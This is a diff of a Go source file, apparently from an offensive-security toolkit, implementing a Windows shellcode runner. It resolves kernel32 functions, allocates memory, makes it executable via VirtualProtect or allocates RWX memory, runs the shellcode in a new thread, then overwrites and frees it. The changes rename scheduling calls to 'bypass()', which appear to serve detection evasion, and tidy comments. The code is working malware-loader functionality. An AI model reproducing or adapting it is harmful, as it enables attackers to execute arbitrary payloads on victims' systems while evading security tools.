@@ -18,10 +18,9 @@ const (
 	MethodCreateThread   = "thread"
 )
 
-// Execute is used to execute shellcode.
-// default method is VirtualProtect,
-// it will block until shellcode return.
-// warning: shellcode slice will be cover.
+// Execute is used to execute shellcode, default method is VirtualProtect,.
+// It will block until shellcode return.
+// warning: shellcode slice will be covered.
 func Execute(method string, shellcode []byte) error {
 	switch method {
 	case "", MethodVirtualProtect:
@@ -46,7 +45,7 @@ var (
 )
 
 func initFindProcVirtualProtect() {
-	schedule()
+	bypass()
 	var kernel32 *syscall.DLL
 	kernel32, initVirtualProtectErr = syscall.LoadDLL("kernel32.dll")
 	if initVirtualProtectErr != nil {
@@ -64,20 +63,20 @@ func initFindProcVirtualProtect() {
 		{"VirtualFree", &vpVirtualFree},
 	}
 	for i := 0; i < 5; i++ {
-		schedule()
+		bypass()
 		proc, err := kernel32.FindProc(procMap[i].name)
 		if err != nil {
 			initVirtualProtectErr = err
 			return
 		}
-		schedule()
+		bypass()
 		*procMap[i].proc = proc
 	}
 }
 
-// VirtualProtect is used to use virtual protect to execute
-// shellcode, it will block until shellcode exit, so usually
-// need create a goroutine to execute VirtualProtect.
+// VirtualProtect is used to use virtual protect to execute shellcode,
+// it will block until shellcode exit, so usually  need create a goroutine
+// to execute VirtualProtect.
 func VirtualProtect(shellcode []byte) error {
 	l := len(shellcode)
 	if l == 0 {
@@ -99,7 +98,7 @@ func VirtualProtect(shellcode []byte) error {
 		memRelease    = uintptr(0x8000)
 		infinite      = uintptr(0xFFFFFFFF)
 	)
-	schedule()
+	bypass()
 	memAddr, _, err := vpVirtualAlloc.Call(0, uintptr(l),
 		memReserve|memCommit, pageReadWrite)
 	if memAddr == 0 {
@@ -107,11 +106,11 @@ func VirtualProtect(shellcode []byte) error {
 	}
 
 	// copy shellcode
-	rand := random.New()
+	rand := random.NewRand()
 	count := 0
 	for i := 0; i < l; i++ {
 		if count > scheduleCount {
-			schedule()
+			bypass()
 			count = 0
 		} else {
 			count++
@@ -125,7 +124,7 @@ func VirtualProtect(shellcode []byte) error {
 	}
 
 	// set execute
-	schedule()
+	bypass()
 	var run uintptr
 	ok, _, err := vpVirtualProtect.Call(memAddr, uintptr(l),
 		pageExecute, uintptr(unsafe.Pointer(&run))) // #nosec
@@ -134,15 +133,15 @@ func VirtualProtect(shellcode []byte) error {
 	}
 
 	// execute shellcode
-	schedule()
+	bypass()
 	threadAddr, _, err := vpCreateThread.Call(0, 0, memAddr, 0, 0, 0)
 	if threadAddr == 0 {
 		return errors.WithStack(err)
 	}
-	schedule()
+	bypass()
 	_, _, _ = vpWaitForSingleObject.Call(threadAddr, infinite)
 	// set read write
-	schedule()
+	bypass()
 	ok, _, err = vpVirtualProtect.Call(memAddr, uintptr(l),
 		pageReadWrite, uintptr(unsafe.Pointer(&run))) // #nosec
 	if ok == 0 {
@@ -150,15 +149,15 @@ func VirtualProtect(shellcode []byte) error {
 	}
 
 	// cover shellcode and free allocated memory
-	schedule()
-	rand = random.New()
+	bypass()
+	rand = random.NewRand()
 	for i := 0; i < l; i++ {
 		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i))) // #nosec
 		*b = byte(rand.Int64())
 	}
 	_, _, _ = vpVirtualFree.Call(memAddr, 0, memRelease)
 
-	schedule()
+	bypass()
 	return nil
 }
 
@@ -174,7 +173,7 @@ var (
 )
 
 func initFindProcThread() {
-	schedule()
+	bypass()
 	var kernel32 *syscall.DLL
 	kernel32, initThreadErr = syscall.LoadDLL("kernel32.dll")
 	if initThreadErr != nil {
@@ -191,18 +190,18 @@ func initFindProcThread() {
 		{"VirtualFree", &tVirtualFree},
 	}
 	for i := 0; i < 4; i++ {
-		schedule()
+		bypass()
 		proc, err := kernel32.FindProc(procMap[i].name)
 		if err != nil {
 			initThreadErr = err
 			return
 		}
-		schedule()
+		bypass()
 		*procMap[i].proc = proc
 	}
 }
 
-// CreateThread is used to create thread to execute shellcode
+// CreateThread is used to create thread to execute shellcode.
 // it will block until shellcode exit, so usually need create
 // a goroutine to execute CreateThread.
 func CreateThread(shellcode []byte) error {
@@ -225,7 +224,7 @@ func CreateThread(shellcode []byte) error {
 		memRelease           = uintptr(0x8000)
 		infinite             = uintptr(0xFFFFFFFF)
 	)
-	schedule()
+	bypass()
 	memAddr, _, err := tVirtualAlloc.Call(0, uintptr(l),
 		memReserve|memCommit, pageExecuteReadWrite)
 	if memAddr == 0 {
@@ -233,11 +232,11 @@ func CreateThread(shellcode []byte) error {
 	}
 
 	// copy shellcode
-	rand := random.New()
+	rand := random.NewRand()
 	count := 0
 	for i := 0; i < l; i++ {
 		if count > scheduleCount {
-			schedule()
+			bypass()
 			count = 0
 		} else {
 			count++
@@ -251,23 +250,23 @@ func CreateThread(shellcode []byte) error {
 	}
 
 	// execute shellcode
-	schedule()
+	bypass()
 	threadAddr, _, err := tCreateThread.Call(0, 0, memAddr, 0, 0, 0)
 	if threadAddr == 0 {
 		return errors.WithStack(err)
 	}
-	schedule()
+	bypass()
 	_, _, _ = tWaitForSingleObject.Call(threadAddr, infinite)
 
 	// cover shellcode and free allocated memory
-	schedule()
-	rand = random.New()
+	bypass()
+	rand = random.NewRand()
 	for i := 0; i < l; i++ {
 		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i))) // #nosec
 		*b = byte(rand.Int64())
 	}
 	_, _, _ = tVirtualFree.Call(memAddr, 0, memRelease)
 
-	schedule()
+	bypass()
 	return nil
 }
